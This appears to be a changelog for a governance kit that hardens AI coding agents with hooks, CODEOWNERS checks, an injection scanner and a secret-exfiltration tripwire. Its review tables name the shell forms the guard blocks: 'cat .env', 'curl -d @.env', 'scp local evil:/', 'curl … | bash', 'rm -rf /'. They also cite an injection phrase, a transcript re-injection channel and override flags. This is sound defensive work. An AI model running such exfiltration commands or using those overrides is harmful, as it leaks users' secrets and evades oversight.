# v2 → v3: what changed and the evidence behind it

Every change traces to a verified finding from a 2026-06 research pass
(multi-source, adversarially verified) plus a hands-on audit of v2.

## 1. Hook-wired compaction recovery (was: honor-system snapshots)

v2 documented a snapshot cadence ("after every TodoWrite change...")
with no mechanism — `snapshot_session.py` had to be invoked manually,
and `docs/.todo_state.json` was read by it but written by nothing.

v3: `.claude/settings.json` wires PreCompact + SessionEnd to
`session_handoff.py capture`, SessionStart to `restore` (re-injection
via `hookSpecificOutput.additionalContext`). `todo_state_hook.py`
mirrors TodoWrite on every call.

Evidence: post-compaction degradation is documented on Anthropic's own
issue tracker (anthropics/claude-code#13112) and has spawned 6+
independent handoff tools; the hooks used here are officially
documented (code.claude.com/docs/en/hooks). Capture always exits 0 —
a blocking PreCompact hook can wedge a session at the context limit.

## 2. Lint-on-write (was: lint at commit time only)

PostToolUse hook on Edit/Write/MultiEdit runs the language's linter on
the touched file; errors return on exit 2 and feed straight back to
the agent.

Evidence: advisory instructions ("always run the linter") degrade as
context fills; hooks fire deterministically every time. This is the
single best-documented advantage of deterministic enforcement over
prompt discipline in community experience reports.

## 3. Progressive disclosure (was: mandatory wholesale reads)

v2's skills were 15-line stubs while its real content (26KB of
checklists, 23KB of review prompts) sat in docs the workflows told the
agent to read inline. Inverted.

v3: skill bodies carry the actual workflow; heavy reference material
stays on disk and is read by subagents (`checklist-auditor`, the
ultrareview lenses) in their own context. Resting cost per skill ≈
frontmatter only (~100 tokens, per Anthropic's Agent Skills
architecture); the main context never loads the corpus.

## 4. Cache-stable keystone

AGENTS.md is byte-stable (no dates, no injected state) and instructs
agents to keep it that way. Volatile content arrives via hooks at
context tail.

Evidence: cache reads are 0.1x base input price; any byte change at
the prompt top invalidates the prefix cache (platform.claude.com
prompt-caching docs). Startup protocol trimmed: last 5 HISTORY entries
(was 10), knowledge docs just-in-time only — context-rot research
(Chroma; NoLiMa, ICML 2025) shows recall degrades with context size
across all tested models, so the budget goes to the work, not the
ritual.

## 5. Profile-gated ceremony (was: everything on by default)

starter = core validators + hooks. standard adds lint/test gates +
postmortem cross-ref. strict adds the 4-field commit protocol,
postmortem-per-bugfix hooks, validator-coverage meta-gate, and the
extras/ machinery (calibration, stale-phrases, license headers).

Evidence: across spec-driven and process frameworks, per-action
ceremony is the most-cited abandonment driver while per-payoff
ceremony survives; v2's own Principle 13 (substrate-to-product ratio)
said this and the default install ignored it. Postmortems remain in
standard but with a severity threshold (see `write-postmortem` skill)
instead of per-bugfix.

## 6. Polyglot core (was: Python-everywhere)

`--lang auto|python|node|go|none` detection; python-only pre-commit
blocks stripped for other stacks; `.substrate/config` gives manage.sh
LINT/TYPECHECK/TEST command indirection; pyproject.toml rendered only
for python installs.

## 7. Compact auditor verdicts

All auditor agents (plus new `checklist-auditor`) cap reports at 500
tokens: verdict + file:line findings only.

Evidence: subagent isolation compresses tens of thousands of
exploration tokens into 1-2k summaries (Anthropic context-engineering
post) — but only if the subagent is told to be compact; verbose
auditor returns forfeit the benefit.

## 8. Supply-chain trims

Removed `manage.sh tools` and `manage.sh graphify` (installed unpinned
global npm/pip packages — exactly the pattern `check_agent_harness.py`
exists to flag). Removed `snapshot_session.py` (superseded). Moved
`calibrate_diy_ultrareview.py`, `check_stale_phrases.py`,
`check_license_headers.py` to `extras/` (strict-only install).

## What did NOT change

- Doc-drift detection (`covers:` + `last_human_reviewed`) — the kit's
  most distinctive asset; no popular alternative has expiring docs.
- HISTORY append-only + SHA validation — anti-fabrication.
- Read-only auditors on both harnesses.
- ADR discipline (Alternatives Considered required).
- Secret-read denies in settings.json.
- The core thesis: agents propose; deterministic gates decide.

## v3.1 hardening pass (external security review)

An external audit of v3.0 found a critical injection channel and
several reliability gaps. All P0/P1 items fixed:

| # | Finding | Fix |
|---|---|---|
| P0 | `session_handoff.py` persisted raw transcript turns and re-injected them as `additionalContext` — a prompt-injection persistence channel | Default capture is structured-state-only (git + tool facts). Transcript capture is opt-in (`SUBSTRATE_HANDOFF_TRANSCRIPT=1`), and when on: secret-redacted, instruction-stripped, size-capped, wrapped in an explicit UNTRUSTED block. All writes pass through `_redact()` |
| P0 | Secret-read denies covered the Read tool but not Bash (`cat .env`, `grep -r API_KEY`, `curl -d @.env`) | New `check_exfil_guard.py` PreToolUse(Bash) hook blocks secret-read/exfil shell patterns before execution (exit 2). Audited override: `SUBSTRATE_ALLOW_SECRET_CMD=1` |
| P0 | Hooks used relative paths, no timeouts | All hooks use `$CLAUDE_PROJECT_DIR` absolute paths + explicit `timeout` |
| P0 | `CODEOWNERS.template` copied to a name GitHub ignores | Installed as `.github/CODEOWNERS.suggested`; doctor warns until renamed. (Not auto-activated: placeholder `@teams` would block every merge under branch protection) |
| P0 | Scheduled-audit report discarded by ephemeral runner | `actions/upload-artifact` + auto-open-issue on failure |
| P0 | `agent-config-audit` installed unpinned external `agentseal \|\| true` (supply-chain + advisory-only) | Removed external package; the local `check_agent_harness.py` is the real gate |
| P1 | CI/dependabot/release-gate Python-centric | CI conditionally bootstraps python/node/go; dependabot generated per-lang; release-gate routes language-native tests via `.substrate/config` |
| P1 | Doc-drift suffixes missed `.js/.go/.rs` etc. | `_code_suffixes()` is multilang + `SUBSTRATE_CODE_SUFFIXES` override |
| P1 | `substrate_doctor.py` too shallow | Added `--quick`/`--security` levels: hook-path/timeout checks, secret-deny coverage, CODEOWNERS warning, lint/test tool-on-PATH checks |
| P1 | Stale docs (META_SYSTEM_KIT, "v2", Python 3.13, `manage.sh tools`, "~24 gates") | Global rename + version fixes + new `test_doc_consistency.py` that fails CI on regressions |
| P1 | Source-root `pytest` failed (contract tests assumed installed layout) | Contract tests skip unless installed; install-matrix is the real check |
| — | Codex framed as full support | Honest support matrix below; Codex is config-only |

### Cross-agent support matrix (honest)

_(v3.1 matrix — SUPERSEDED by the v3.2 matrix below, which wires real
hooks for Codex and Copilot.)_

| Capability | Claude Code | Codex | GitHub Copilot |
|---|---|---|---|
| Stable repo instructions (AGENTS.md) | yes | yes | yes (native) |
| Skills (progressive disclosure) | yes | partial (config) | via `.github/instructions/` |
| Deterministic hooks (lint/handoff/exfil-guard) | yes | config-only at v3.1 | no at v3.1 |
| Read-only auditor agents | yes | yes | manual |
| Secret-read deny | yes | partial | no |
| Copilot-native instructions file | n/a | n/a | yes (`.github/copilot-instructions.md`) |

## v3.2 hardening pass (second external review)

The v3.1 review confirmed the injection fix and flagged reliability +
host-integration gaps. All P0/P1 fixed:

| # | Finding | Fix |
|---|---|---|
| P0 | `./manage.sh setup` failed in node/go/none (`pre-commit: command not found`) | A dedicated `.substrate/venv` now holds pre-commit + PyYAML and runs all validators regardless of project language. Verified: setup+check pass for python/node/go/none × starter/standard/strict |
| P1 | Node gate `npx --no-install eslint .` failed in fresh repos | `scripts/lang_gate.sh` adapter: runs `npm run <gate>` only if the script exists, else skips with a message |
| P1 | Go `go vet ./...` failed on empty-but-valid modules | adapter guards vet/test behind `go list ./...` |
| P1 | `substrate_doctor` passed non-operational repos | new `--operational` mode: verifies substrate venv + pre-commit present, validators import, configured commands resolve, memory chain intact. CI runs it. BLOCK rc=1 before setup, PASS after |
| P1 | Codex `[features] codex_hooks` (deprecated) + no real hooks | canonical `hooks = true`; real `.codex/hooks.json` wiring exfil guard (PreToolUse), handoff (SessionStart/Stop), lint (PostToolUse) — same runner-agnostic scripts, exit-2 blocks per [Codex hooks docs](https://developers.openai.com/codex/hooks) |
| P1 | Copilot instructions referenced `.github/instructions/` that bootstrap never created | bootstrap now generates `.github/instructions/*.instructions.md` AND `.github/hooks/exfil-guard.json` with `copilot_hook_adapter.py` translating the guard verdict into Copilot's `permissionDecision` ([Copilot hooks docs](https://docs.github.com/en/copilot/reference/hooks-configuration)) |
| Sec | Exfil guard regex-only, bypassable | expanded + tiered (starter/standard/strict): now also catches env/printenv/set dumps, `os.environ`, `git grep <secret>`, archive-to-/tmp, `find -exec` over secret paths, shell-var indirection. Reframed in docs as a **tripwire, not a sandbox** |
| Sec | strict mode didn't require active CODEOWNERS | doctor BLOCKs in strict until `.github/CODEOWNERS` is active; CODEOWNERS template now owns `.substrate/`, `.claude/`, `.codex/`, `.agents/`, `.github/hooks/` |
| Mem | `CURRENT_SESSION.md` was the mutable trusted-state root | new `scripts/memory_log.py`: append-only, SHA-256 **hash-chained** `.substrate/memory/events.jsonl` with `verify` (tamper → BREAK), `tail`, `tasks`. Handoff appends a chained event; CURRENT_SESSION.md is now explicitly a derived/disposable view. doctor verifies the chain |
| Test | Full source suite hung at the exfil tests (`uv run ruff` venv creation) | `SUBSTRATE_LINT_DIRECT=1` forces direct ruff; all test subprocesses carry a 30s timeout. Suite: 25 passed / 7 skipped / ~3.5s |
| Docs | `~24 hooks`, universal commit-msg claim, META_SYSTEM in `.py`, Python 3.13, deprecated codex flag | all fixed; `test_doc_consistency.py` now scans `.py`/`.template` too and gates codex_hooks, Python 3.13, and referenced-path generation |

### Cross-agent support matrix (v3.2 — hooks now wired for all three)

| Capability | Claude Code | Codex | GitHub Copilot |
|---|---|---|---|
| Stable repo instructions | `AGENTS.md` | `AGENTS.md` | `AGENTS.md` + `.github/copilot-instructions.md` + `.github/instructions/` |
| Deterministic PreToolUse exfil guard | yes (`.claude/settings.json`) | yes (`.codex/hooks.json`) | yes (`.github/hooks/` via adapter) |
| Session handoff (capture/restore) | yes | yes (SessionStart/Stop) | yes (sessionStart/End) |
| Lint-on-write | yes | yes (PostToolUse) | — |
| Read-only auditor agents | yes | yes | manual |

Caveat: Codex/Copilot hook schemas evolve and require operator trust
(Codex records a hook hash you must approve). The scripts are
runner-agnostic; the wiring JSON follows current official docs and
should be re-verified against the host version before high-stakes use.

## v3.2.1 hardening pass (third external review)

The third review confirmed the v3.2 architecture and found release-quality
regressions — a broken default install path, a security hook that missed
the host's documented payload, and several host-robustness gaps. All
P0/P1 fixed:

| # | Finding | Fix |
|---|---|---|
| **P0** | Default `bootstrap.sh` (no `--no-doctor`) ran the full doctor — whose operational check BLOCKs because `.substrate/venv` doesn't exist yet → deadlock | bootstrap runs `doctor --quick` by default (full only with `--install-tools`, which runs setup first). **Verified: default bootstrap rc=0, doctor PASS for python/node/go/none** |
| **P0** | Copilot exfil hook returned `allow` for `cat .env` under GitHub's documented `toolName` + JSON-string `toolArgs` payload — security hook silently ineffective | `copilot_hook_adapter.py` now parses `toolName`/`toolArgs` (incl. JSON-string decode) and the VS Code `tool_name`/`tool_input` shape; only inspects shell tools. Regression tests use GitHub's exact documented shape |
| **P0** | `release_gate.sh` called `pre-commit` from ambient PATH → `command not found` in node/go | routes pre-commit through `.substrate/venv/bin`. Verified: release-gate passes in a node repo |
| P1 | Strict readiness incoherent (`--operational` passed while setup failed on CODEOWNERS) | clear contract: `setup`→operational (no governance), `--strict` = operational+security+governance, `check`(strict profile) and CI(strict) run `--strict`. strict/none: setup OK, check BLOCKs on missing CODEOWNERS |
| P1 | Codex hooks used repo-relative `python3 scripts/...` (break from a subdirectory) | commands resolve repo root via `git rev-parse --show-toplevel`; all hook scripts also self-resolve root through `_substrate_root.py` (`SUBSTRATE_PROJECT_DIR`/`CLAUDE_PROJECT_DIR`/git/ancestor) instead of `Path.cwd()` |
| P1 | Codex lint-on-write matched `Bash` but `lint_on_write` needs a file path (apply_patch edits → no-op) | removed the mis-wired Codex lint hook; documented honestly that lint-on-write is Claude-only and Codex uses `./manage.sh check` |
| P1 | `check_agent_harness` didn't scan the new Copilot surfaces | scans `.github/copilot-instructions.md`, `.github/instructions/**`, `.github/hooks/**`, `.github/skills/**`; added deny patterns for `--dangerously-bypass-hook-trust` and `SUBSTRATE_ALLOW_SECRET_CMD` in config. Injection regex broadened (now catches "ignore previous **system** instructions") |
| Mem | Hash chain alone isn't tamper-proof (attacker recomputes the chain) | honest relabel as an **integrity tripwire**; added file locking (flock) on append; `anchor` writes the head hash to a git note (`refs/notes/substrate-memory`) outside events.jsonl, and `verify --anchor` catches a full rewrite. Verified: plain verify passes a recomputed chain, `--anchor` BLOCKs it |
| Test | Source suite hung in aggregate | `conftest.py` forces `SUBSTRATE_LINT_DIRECT`; every subprocess has a 30s timeout. 31 passed / 7 skipped / ~3.7s |
| Pkg | `.pytest_cache/` shipped in the artifact | clean step + zip excludes `.pytest_cache`/`__pycache__`/`*.pyc`/`.substrate/venv` |

### Cross-agent support matrix (v3.2.1 — corrected/honest)

| Capability | Claude Code | Codex | GitHub Copilot |
|---|---|---|---|
| Stable repo instructions | `AGENTS.md` | `AGENTS.md` | `AGENTS.md` + `.github/copilot-instructions.md` + `.github/instructions/` |
| PreToolUse exfil guard | yes | yes (`.codex/hooks.json`) | yes (`.github/hooks/` via adapter; parses host payload) |
| Session handoff | yes (PreCompact/SessionEnd/Start) | yes (SessionStart/Stop) | yes (sessionStart/End) |
| Lint-on-write | yes | **no** (apply_patch edits — run `./manage.sh check`) | — |
| Subdirectory-safe hook paths | `$CLAUDE_PROJECT_DIR` | git-root resolved | git-root resolved |
| Read-only auditor agents | yes | yes | manual |

Caveat: Codex/Copilot hook schemas evolve and require operator trust
(Codex records a hook hash you must approve before it runs). The wiring
follows current official docs; re-verify against the host version.

## v3.2.2 hardening pass (fourth external review)

The fourth review confirmed the standard path is healthy and found
strict-mode security/governance false-greens. All P0/P1 fixed:

| # | Finding | Fix |
|---|---|---|
| **P0** | Strict exfil policy bypassed from a subdirectory — `check_exfil_guard._profile()` still read `.substrate/config` via `Path.cwd()`, so a hook launched from `src/` couldn't find it and silently downgraded strict→standard | the guard resolves repo root via `_substrate_root.py` (`SUBSTRATE_PROJECT_DIR`/`CLAUDE_PROJECT_DIR`/git/ancestor). **Verified: `curl -T` blocked from `src/deep/` under strict** (was allowed). Regression test added |
| P1 | Strict CODEOWNERS false-green — copying the `.suggested` file with `@your-org/*` placeholders passed strict | doctor parses the active CODEOWNERS and BLOCKs placeholder owners GitHub would ignore (`@your-org/*`, `@org/team`, `<...>`, TODO/CHANGEME). Verified: placeholder → BLOCK, real owner → pass |
| P1 | Explicit `--runner python/poetry` unreliable — ambient ruff/pytest, or `poetry run` when poetry absent | new `run_python_gate.sh` adapter resolves the runner consistently with what setup installed (uv→.venv→substrate venv→ambient), fails loudly on a selected-but-missing runner. `SUBSTRATE_RUNNER` recorded in config; doctor BLOCKs an unavailable explicit runner. Python-only pre-commit gates route through the adapter |
| P1 | `agent-config-audit.yml` PR trigger didn't watch the new Copilot surfaces | added `.github/hooks/**`, `.github/copilot-instructions.md`, `.github/instructions/**`, `.github/skills/**`, `.substrate/config` (local scanner + CI trigger now cover the same surface) |
| P1 | Scheduled/full audit called ambient `pytest`/`pre-commit` | `substrate_audit.py` resolves substrate-venv tools; scheduled-audit workflow runs `./manage.sh setup` then `./manage.sh full-audit` |
| Sec | Exfil guard missed heredoc interpreter reads and archive-pipe-upload | added patterns: `python - <<EOF ... open('.env')` and `tar … | curl --data-binary @-`. Plus a 16 KB input cap as a ReDoS / high-CPU defense (the reviewer saw a guard process spinning) |
| Test | source-root suite still hung for the reviewer | the ReDoS cap removes the likely high-CPU cause; `conftest.py` forces hermetic linting; every subprocess has a 30s timeout. 34 passed / 7 skipped / ~5s |

Honest scope unchanged: the exfil guard is a **tripwire, not a sandbox**
(regex/pattern matching, not a shell parser); strict containment needs a
sandboxed runtime with no secret access. The CODEOWNERS check rejects
placeholders offline but cannot prove GitHub write permissions without
the API — documented as an operator step.

## v3.2.3 hardening pass (fifth external review)

The fifth review confirmed standard-mode is credible and found three
narrower strict-mode gaps. All fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | Non-Python full-audit fell back to ambient/missing `pytest` (substrate venv only had pre-commit + PyYAML) | substrate venv installs `pytest` for **every** language (the kit ships its tests to every repo); `substrate_audit.py` resolves substrate-venv tools and SKIPs (never ambient) if absent. Verified: full-audit in a node repo with restricted PATH uses `.substrate/venv/bin/pytest`, rc=0 |
| P1 | Strict CODEOWNERS required a non-placeholder file but not actual coverage — `README.md @realuser` passed strict | strict doctor now requires real-owner coverage of sensitive substrate surfaces (AGENTS.md, CLAUDE.md, `.claude/**`, `.codex/**`, `.agents/**`, `.github/hooks/**`, `.github/instructions/**`, `.github/workflows/**`, `.substrate/**`, `scripts/**`, CODEOWNERS itself). Verified: bare `README.md @realuser` → BLOCK, catch-all `* @realuser` → pass |
| P1 | Source-root test suite didn't reliably complete | `pytest.ini` (`-p no:randomly -p no:cacheprovider`) makes runs deterministic; ReDoS input cap removed the high-CPU cause; all subprocesses time out at 30s. Verified: two back-to-back runs identical, 37 passed / 7 skipped / ~5.5s. `pytest.ini` is also installed into target repos |
| P2 | Copilot hook shipped an invalid PowerShell command | removed it — the Copilot cloud coding agent runs Linux/bash only (documented in the hook `_doc`). bash is the active path |
| — | Host-payload contract coverage | added regression tests for Codex-style `tool_name`/`tool_input` payloads, the ReDoS length cap, and CODEOWNERS sensitive-surface coverage |

Standard-mode is now credible for controlled trial across Python, Node,
Go, and no-language repos (the reviewer's assessment). Strict mode now
enforces real CODEOWNERS coverage and environment-independent audits.

## v3.2.4 hardening pass (sixth external review)

The sixth review confirmed standard-mode is trial-worthy and found two
strict-mode semantic gaps. Both fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | Strict CODEOWNERS coverage was a prefix heuristic — `/scripts/check_*.py @realuser` falsely "covered" `scripts/`, and an ownerless last-match (`* @realuser` then `/.github/hooks/`) passed | replaced with a faithful CODEOWNERS evaluator: patterns compile to path regexes, coverage is checked against representative **sample files** per surface, and GitHub **last-match** semantics apply (an ownerless final match = uncovered). Verified: prefix-rule → BLOCK, ownerless-override → BLOCK, catch-all/explicit-dir/template-with-real-owners → pass |
| P1 | Strict exfil allowed common upload forms — `curl -F @file`, `curl --data-binary @file`, `wget --post-file`, inline-interpreter `requests.post(...open())` | added a network-file-upload detector (curl/wget upload flags with `@file`; `-T`/`--upload-file`; `--post-file`/`--body-file`) firing at standard+, and an interpreter-reads-file-and-sends-network detector. 9/9 upload forms block; benign `curl -o`, downloads, and `requests.get().json()` still pass |
| P2 | README top section said v3.2.1 while VERSION was 3.2.3 | added a "Current status (v3.2.3)" section with the honest limitations list; older sections marked historical |
| Test | source-root hang diagnosability | `conftest.py` arms a `faulthandler` watchdog (dumps all thread stacks on a 600s stall, `exit=True`) so any future hang self-diagnoses instead of going silent. Slowest test locally is 0.77s; full suite ~6s |

Note on `.github/skills/**`: the agent-config-audit watches it (defensive — flags tampering if a repo adds it) but strict CODEOWNERS coverage does not require it, since the kit generates skills under `.claude/skills` and `.agents/skills`, not `.github/skills`.

## v3.2.5 hardening pass (seventh external review)

The seventh review confirmed the v3.2.4 fixes and found a CODEOWNERS
matcher-fidelity bug plus more exfil upload forms. Both fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | CODEOWNERS `*` over-matched — `/.github/* @realuser` falsely "covered" the grandchild `.github/hooks/exfil-guard.json` (my regex appended `(/.*)?` to non-dir patterns) | `_co_pattern_to_regex` now matches GitHub semantics: `*` is single-segment (no `/`), only trailing-`/` and `**` recurse, non-recursive patterns match exactly. 13/13 fidelity cases pass; `/.github/* ` no longer covers nested files, `/.github/`/`/.github/**` do |
| P1 | Strict exfil allowed `scp`/`rsync` push, `nc`/`socat < file`, `curl -F file=<file`, httpie `file@path` | added detectors for stdin-into-network-sender, httpie field uploads, and direction-aware scp/rsync (PUSH to `remote:` blocks; PULL from remote allows — verified `scp local evil:/` blocks, `scp host:/f .` and `git clone git@…` allow) |
| P2 | CODEOWNERS template ordering footgun — broad `/.github/ @devops` came AFTER `/.github/hooks/`, so last-match gave devops the hook surface | reordered: broad rules first, substrate rules last (they win). Verified: `.github/hooks/`, `.github/CODEOWNERS`, `.github/workflows/` resolve to substrate-maintainers |
| P2 | README said v3.2.3; profile-tier comment said "standard+" for an all-tier rule | README → v3.2.5 current-status; comment corrected (local-file upload blocks at all tiers, before the starter return) |

Honest framing kept: the exfil guard is a **tripwire, not a sandbox** —
it now covers more common upload/transfer mechanisms (curl/wget/httpie
uploads, scp/rsync push, nc/socat stdin, interpreter upload, archive
pipe), but strict containment still requires sandboxed execution with no
secret-bearing environment and network egress control.

## v3.2.6 hardening pass (eighth external review)

The eighth review confirmed the matcher fixes and found that strict
coverage still checked a fixed sample list, not the actual files. Fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | Strict CODEOWNERS coverage checked a fixed 16-file **sample**, so a CODEOWNERS owning exactly those samples passed while `.codex/config.toml`, `.claude/skills/**`, `.github/workflows/scheduled-audit.yml`, etc. stayed unowned | `_codeowners_coverage_gaps` now enumerates the **actual** privileged files on disk (recursively under `scripts/`, `.claude/`, `.codex/`, `.agents/`, `.github/hooks|instructions|workflows/`, plus singletons), excluding generated toolchain state (`.substrate/venv`, `__pycache__`). Verified: sample-only ownership → BLOCK (75 files unowned); recursive dir rules / catch-all → PASS |
| P1 | GitHub ignores a CODEOWNERS file over 3 MB, but doctor passed it | added a 3 MB load-limit check (`CODEOWNERS_MAX_BYTES`). Verified: a >3 MB file → BLOCK |
| P2 | The httpie upload pattern false-positived on `curl -H "From: user@example.com"` | scoped httpie `field@path` detection to the `http`/`https`/`httpie` commands only (curl headers no longer misread); `http POST … email=user@x` (a data field) still allowed |
| Sec | More transfer forms | added http/httpie stdin upload, `rsync://` protocol push, `gh gist create <file>`, and `dd … | nc`. Direction-aware scp/rsync retained. Honest scope kept: a tripwire, not a sandbox |
| P2 | README claimed CODEOWNERS "matches GitHub semantics exactly" + stale version range | softened to "implements the main behaviors, not a full validator"; version range corrected |

Coverage now proves the actual generated privileged files are owned, not
that a handful of representative paths are. The CODEOWNERS evaluator
remains an offline approximation (it cannot verify owner existence or
write access — that needs the GitHub API), and the exfil guard remains a
tripwire that raises attacker cost, not a containment boundary.

## v3.2.7 hardening pass (ninth external review)

The ninth review found strict coverage omitted load-bearing control
files — most critically `manage.sh`, which CI executes. Fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | Strict CODEOWNERS coverage omitted `manage.sh` (CI runs `./manage.sh setup\|doctor\|check`), `pytest.ini`, `tests/**`, `docs/knowledge/**`, `docs/decisions/**`, `.github/dependabot.yml`, `.gitattributes`, `.gitignore` | added all to the privileged-surface set. Verified: dir rules omitting `manage.sh` → BLOCK; catch-all → PASS. Privileged = anything that changes what the agent or CI will do |
| P1 | The active CODEOWNERS file didn't have to own itself if it lived at repo root or `docs/` (only `.github/CODEOWNERS` was hardcoded) | coverage now includes the **actual active CODEOWNERS path** (`.github/`, root, or `docs/`, whichever GitHub loads) |
| P1 | Owner-token syntax was too weak — `* @` and `* x@` (no domain) counted as real owners | `_is_real_owner` requires a valid `@user` / `@org/team` handle or a real email; `@`, `x@`, malformed teams are rejected. Verified: `* @` → BLOCK |
| Sec | Quoted scp/rsync push (`scp x 'evil:/tmp/'`) and interpreter socket/https uploads (Python `socket.send(open())`, Node `https.request`+`readFileSync`, Perl `LWP`+`open`) were missed | `_is_scp_push` uses `shlex.split` (strips quotes); interpreter detectors extended. Direction-aware pulls still allowed |
| P2 | `agent-config-audit.yml` didn't trigger on `manage.sh` etc. | added `manage.sh`, `pytest.ini`, `tests/**`, `docs/knowledge/**`, `.github/dependabot.yml` to the workflow path filter (local scanner + CI trigger + CODEOWNERS coverage now agree) |

Strict governance now protects every file that can change agent or CI
behavior, not just hooks/scripts/agent-config. Residuals unchanged and
documented: the CODEOWNERS validator is an offline approximation (no
owner-existence/write-access proof without the GitHub API); the exfil
guard is a tripwire (curl `--config`-hidden uploads and novel
interpreter variants can still pass) — strict containment needs a
sandboxed runtime.

## v3.2.8 hardening pass (tenth external review)

The tenth review found the governance surfaces weren't handled
*consistently* — `docs/HISTORY.md` is agent-read-at-startup yet
ownerless+unscanned, and the harness didn't scan several governed
surfaces. Fixed:

| # | Finding | Fix |
|---|---|---|
| P1 | `docs/HISTORY.md` is read by agents at startup (AGENTS.md protocol) but was ownerless (template had `# no review needed`, an ownerless last-match line) and unscanned | added to strict CODEOWNERS coverage; template line now owns it (`@substrate-maintainers @sre`); harness now scans it for injection. Verified: ownerless HISTORY → BLOCK; injected phrase in HISTORY → BLOCK |
| P1 | `check_agent_harness.py` didn't scan `docs/knowledge/**`, `docs/decisions/**`, `docs/HISTORY.md`, `manage.sh`, `scripts/**`, `tests/**`, `.pre-commit-config.yaml`, etc. | split into CONTEXT (markdown/docs/instructions → SECRET+SHELL_DANGER+INJECTION) and CODE/CONFIG (shell/python/CI → SECRET+SHELL_DANGER, no injection-phrase scan). The substrate's own pattern-defining validators are allowlisted (scanned for real secrets only) so they don't self-flag. Verified: injection in knowledge doc → BLOCK; bypass flag in manage.sh → BLOCK; clean repo → PASS (86 files scanned) |
| P1/P2 | Optional agent-control surfaces (`.github/skills/**`, `.mcp.json`) weren't required-owned if added after bootstrap | strict coverage now includes them **when present** |
| P2 | `curl --config`/`-K` could hide upload flags in a config file | strict tier denies it |
| P2 | `agent-config-audit.yml` trigger still missed `docs/decisions/**`, `.pre-commit-config.yaml`, `.gitattributes`, `.gitignore`, and the active CODEOWNERS locations | added — local scanner, CI trigger, and strict coverage now name the same surface |
| Test | source-root suite spawned a subprocess per exfil command (slow/flaky in heavy containers) | the pure pattern tests now call the guard **in-process**; only the stdin/exit-code contract uses subprocesses. Slowest test 0.90s, ~5s total |

The governance surface is now consistent: every file that can become
agent context or change the agent/CI environment is covered by
CODEOWNERS, scanned by the harness, and triggers the config-audit
workflow. Residuals unchanged and documented: the CODEOWNERS validator
is offline (no owner-existence/write-access proof); the exfil guard is a
tripwire (novel interpreter/obfuscated forms can still pass) — strict
containment needs a sandboxed runtime.

## v3.2.9 hardening pass (eleventh external review)

The eleventh review's meta-point was the durable fix: governance surfaces
drifted because CODEOWNERS coverage, harness scanning, and the
config-audit trigger were maintained as three separate lists. v3.2.9
introduces a **canonical surface inventory** all three derive from.

| # | Finding | Fix |
|---|---|---|
| **Arch** | No single source of truth → each review found "one more surface" owned-but-unscanned or scanned-but-untriggered | new `scripts/_substrate_surfaces.py` defines CONTEXT/CODE/owned/optional surfaces **once**; `substrate_doctor` (CODEOWNERS coverage), `check_agent_harness` (scanning), and `agent-config-audit.yml` (trigger) all derive from it. A new `test_governance_consumers_derive_from_inventory` pins this |
| P1 | `docs/blind-spot-checklists/**` and `docs/templates/**` (read by checklist-auditor + ultrareview) were unowned, unscanned, untriggered | added to the inventory → now owned (CODEOWNERS), scanned as CONTEXT (injection), and watched by the trigger. Verified: injection in a checklist → BLOCK |
| P1 | `docs/ARCHITECTURE.md` / `docs/INTENT.md` (AGENTS.md architecture docs) were ungoverned | added to owned + context-scanned |
| P1/P2 | Skill supporting scripts/resources (`.claude/skills/**/*.sh` etc.) were owned but not scanned | CODE_GLOBS now include skill resource files (sh/py/js/ts/json/yml/toml). Verified: `rm -rf /` in a skill script → BLOCK |
| P1/P2 | Harness allowlist too broad — `session_handoff.py`/`memory_log.py`/`copilot_hook_adapter.py` were secrets-only | narrowed to just `check_agent_harness.py` (the only file that defines the danger patterns); `check_exfil_guard.py`'s `=1` docstring reworded so it no longer self-flags. Verified: bypass flag in `session_handoff.py` → BLOCK. `tests/**` is owned but not content-scanned (it holds adversarial fixtures by design) |
| P2 | Setup not self-healing after a partial venv install | setup now verifies `import yaml,pytest,pre_commit` + the pre-commit binary and repairs (force-reinstalls the console script if needed). Verified: deleting the pre-commit binary or starting from a bare venv → repaired |

The governance surface is now defined once and enforced three ways from
the same list — adding a surface propagates to ownership, scanning, and
the audit trigger together. Residuals unchanged: CODEOWNERS validation is
offline (no owner-existence/write-access proof); the exfil guard is a
tripwire (sandboxing needed for containment).

## v3.2.10 hardening pass (twelfth external review)

The twelfth review found the central remaining bug: `.substrate/config`
was **sourced as shell** before any validation — config-as-code. Fixed.

| # | Finding | Fix |
|---|---|---|
| **P0** | `manage.sh`/`release_gate.sh`/`lang_gate.sh`/`run_python_gate.sh` did `. .substrate/config` — a PR editing the config ran arbitrary shell during `./manage.sh doctor/check` and in CI, **before** the harness/doctor could block it | new `scripts/_substrate_config.sh` parses the config as DATA: `KEY=VALUE` only, fixed key allowlist, command-substitution/backtick **forbidden**, invalid input aborts (exit 2). All four sourcing sites route through it. **Verified: `echo PWNED` line → not executed, aborts; `$(touch)` → blocked; valid config works** |
| P1 | `.substrate/config` was owned + triggered but NOT harness-scanned (its `LINT_CMD` runs in CI) | added to `CODE_GLOBS`. **Verified: `LINT_CMD="curl … \| bash"` → BLOCK** |
| P1 | UI `design-system/**` (AGENTS.md tells agents to read it on UI work) was ungoverned | added to CONTEXT/CODE globs + OPTIONAL_DIRS + CODEOWNERS template. **Verified: injection in `design-system/MASTER.md` → BLOCK; present-but-unowned → strict BLOCK** |
| P1 | `docs/README.md` was context-scanned but not owned/triggered | added to OWNED_FILES |
| P1 | Workflow trigger was a static path list that drifts from the inventory | removed the `paths:` filter entirely — the audit runs on **every** PR (zero drift); the harness derives the scanned set from the inventory at runtime |
| P2 | Whole-file allowlist of `check_agent_harness.py` hid real danger added to it | line-level exemption: the scanner's own `re.compile(...)` pattern-definition lines are skipped, but real danger elsewhere is caught. **Verified: injected `os.system("curl \| bash")` → BLOCK** |

`.substrate/config` is now data parsed under a strict whitelist, scanned
for shell-danger, and its command values run only AFTER validation. The
config-execution trust boundary the reviews kept circling is closed.
Residuals unchanged: CODEOWNERS validation is offline; the exfil guard is
a tripwire; the source-root suite is watchdog-armed (container-specific
stalls aside).

## v3.2.11 hardening pass (pre-emptive, against the twelfth review's plan)

The twelfth review's runtime hadn't synced the v3.2.10 zip but supplied
an exact follow-up audit plan. Hardened against its two real findings:

| # | Finding | Fix |
|---|---|---|
